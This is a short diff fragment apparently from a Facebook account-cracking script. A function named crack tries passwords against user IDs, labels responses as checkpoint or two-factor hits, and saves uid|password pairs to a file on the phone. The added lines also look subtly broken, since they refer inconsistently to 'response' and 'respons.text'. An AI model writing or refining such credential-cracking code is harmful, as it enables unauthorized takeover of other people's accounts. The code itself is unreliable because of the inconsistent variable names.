@@ -187,12 +187,12 @@ def crack(uid, password_list, total_count):
                         break
                 else:
                     break
-            elif "www.facebook.com" in result["error"]["message"]:
+            elif 'checkpoint' in response:
                 print(f"\r\033[1;93m [⚠ SUMON_2f] {uid} | {pw}")
                 open("/sdcard/SUMON_file_2f.txt", "a").write(f"{uid}|{pw}\n")
                 cps.append(uid+"|"+pw)
                 continue
-            elif 'checkpoint' in result:
+            elif 'confirm' in respons.text:
                 print(f"\r\033[1;93m [⚠ CHECKPOINT] {uid} | {pw}")
                 continue
             else:
